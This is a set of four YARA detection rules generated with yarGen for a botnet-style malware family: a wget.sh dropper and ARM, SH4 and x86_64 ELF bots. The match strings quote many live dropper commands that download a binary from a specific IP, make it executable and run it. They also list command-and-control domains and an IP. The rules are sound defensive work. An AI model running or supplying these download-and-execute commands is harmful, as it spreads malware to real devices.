# YARA RULES
---

## Information

1. All Yara rules were created with the tool "yarGen" which was created by Florian Roth.


```
rule exploits_wget {
   meta:
      description = "exploits - file wget.sh"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2022-03-20"
      hash1 = "46ae7d034ffeb8854dda921e0c91105343f405d883c19ec4897a070335a758ab"
   strings:
      $s1 = "busybox wget http://23.94.22.13/x86_64; chmod 777 x86_64; ./x86_64 agopermshits" fullword ascii
      $s2 = "wget http://23.94.22.13/arm; chmod 777 arm; ./arm agopermshits" fullword ascii
      $s3 = "wget http://23.94.22.13/x86_64; chmod 777 x86_64; ./x86_64 agopermshits" fullword ascii
      $s4 = "busybox wget http://23.94.22.13/mipsel; chmod 777 mipsel; ./mipsel agopermshits" fullword ascii
      $s5 = "wget http://23.94.22.13/arm5; chmod 777 arm5; ./arm5 agopermshits" fullword ascii
      $s6 = "busybox wget http://23.94.22.13/mips; chmod 777 mips; ./mips agopermshits" fullword ascii
      $s7 = "busybox wget http://23.94.22.13/arm7; chmod 777 arm7; ./arm7 agopermshits" fullword ascii
      $s8 = "wget http://23.94.22.13/arm7; chmod 777 arm7; ./arm7 agopermshits" fullword ascii
      $s9 = "wget http://23.94.22.13/arm6; chmod 777 arm6; ./arm6 agopermshits" fullword ascii
      $s10 = "busybox wget http://23.94.22.13/arc; chmod 777 arc; ./arc agopermshits" fullword ascii
      $s11 = "wget http://23.94.22.13/mipsel; chmod 777 mipsel; ./mipsel agopermshits" fullword ascii
      $s12 = "busybox wget http://23.94.22.13/sparc; chmod 777 sparc; ./sparc agopermshits" fullword ascii
      $s13 = "busybox wget http://23.94.22.13/arm6; chmod 777 arm6; ./arm6 agopermshits" fullword ascii
      $s14 = "busybox wget http://23.94.22.13/arm; chmod 777 arm; ./arm agopermshits" fullword ascii
      $s15 = "wget http://23.94.22.13/arc; chmod 777 arc; ./arc agopermshits" fullword ascii
      $s16 = "wget http://23.94.22.13/mips; chmod 777 mips; ./mips agopermshits" fullword ascii
      $s17 = "busybox wget http://23.94.22.13/sh4; chmod 777 sh4; ./sh4 agopermshits" fullword ascii
      $s18 = "busybox wget http://23.94.22.13/arm5; chmod 777 arm5; ./arm5 agopermshits" fullword ascii
      $s19 = "wget http://23.94.22.13/sh4; chmod 777 sh4; ./sh4 agopermshits" fullword ascii
      $s20 = "wget http://23.94.22.13/sparc; chmod 777 sparc; ./sparc agopermshits" fullword ascii
   condition:
      uint16(0) == 0x6777 and filesize < 4KB and
      8 of them
}



rule exploits_arm {
   meta:
      description = "exploits - file arm"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2022-03-20"
      hash1 = "1237033a66167daaeec935142fbd6071c639630847ec5576af666bc516863d28"
   strings:
      $s1 = "POST /cdn-cgi/" fullword ascii
      $s2 = "scan.infectedfam.cc" fullword ascii
      $s3 = "bots.infectedfam.cc" fullword ascii
      $s4 = " '3;=:3;:" fullword ascii /* hex encoded string '3' */
      $s5 = "='7; &;! 1&" fullword ascii /* hex encoded string 'q' */
      $s6 = ".<;:3,=:3" fullword ascii /* hex encoded string '3' */
      $s7 = "zkjtjaz" fullword ascii
      $s8 = "/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID" ascii
      $s9 = "/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93" ascii
      $s10 = "fddldlfb" fullword ascii
      $s11 = "tedzdot" fullword ascii
      $s12 = "/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A" fullword ascii
      $s13 = "/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38" ascii
      $s14 = "/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ" ascii
      $s15 = "dadlcldadg" fullword ascii
      $s16 = "/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ" ascii
      $s17 = "/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A" ascii
      $s18 = " HTTP/1.1" fullword ascii
      $s19 = "23.95.0.211" fullword ascii
      $s20 = "tazeot" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      8 of them
}

rule exploits_sh4 {
   meta:
      description = "exploits - file sh4"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2022-03-20"
      hash1 = "bb4afbfa1103ef2e7a39c32ddde3a1ca6663c2e4e0c68f75f07f5e0e1918be2c"
   strings:
      $s1 = "POST /cdn-cgi/" fullword ascii
      $s2 = "scan.infectedfam.cc" fullword ascii
      $s3 = "bots.infectedfam.cc" fullword ascii
      $s4 = " '3;=:3;:" fullword ascii /* hex encoded string '3' */
      $s5 = "='7; &;! 1&" fullword ascii /* hex encoded string 'q' */
      $s6 = ".<;:3,=:3" fullword ascii /* hex encoded string '3' */
      $s7 = "zkjtjaz" fullword ascii
      $s8 = "/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID" ascii
      $s9 = "/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93" ascii
      $s10 = "fddldlfb" fullword ascii
      $s11 = "tedzdot" fullword ascii
      $s12 = "/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A" fullword ascii
      $s13 = "/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38" ascii
      $s14 = "/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ" ascii
      $s15 = "dadlcldadg" fullword ascii
      $s16 = "/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ" ascii
      $s17 = "/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A" ascii
      $s18 = " HTTP/1.1" fullword ascii
      $s19 = "23.95.0.211" fullword ascii
      $s20 = "ql22,!!!%" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      8 of them
}

rule exploits_x86_64 {
   meta:
      description = "exploits - file x86_64.1"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2022-03-20"
      hash1 = "a877649f7d498125c8c9646c376d3c176444798c9b9a0e3d1f625aefc7ad2617"
   strings:
      $s1 = "POST /cdn-cgi/" fullword ascii
      $s2 = "scan.infectedfam.cc" fullword ascii
      $s3 = "bots.infectedfam.cc" fullword ascii
      $s4 = " '3;=:3;:" fullword ascii /* hex encoded string '3' */
      $s5 = "='7; &;! 1&" fullword ascii /* hex encoded string 'q' */
      $s6 = ".<;:3,=:3" fullword ascii /* hex encoded string '3' */
      $s7 = "zkjtjaz" fullword ascii
      $s8 = "/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID" ascii
      $s9 = "/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93" ascii
      $s10 = "fddldlfb" fullword ascii
      $s11 = "tedzdot" fullword ascii
      $s12 = "/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A" fullword ascii
      $s13 = "/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38" ascii
      $s14 = "/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ" ascii
      $s15 = "dadlcldadg" fullword ascii
      $s16 = "/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ" ascii
      $s17 = "/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A" ascii
      $s18 = " HTTP/1.1" fullword ascii
      $s19 = "23.95.0.211" fullword ascii
      $s20 = "tazeot" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      8 of them
}
```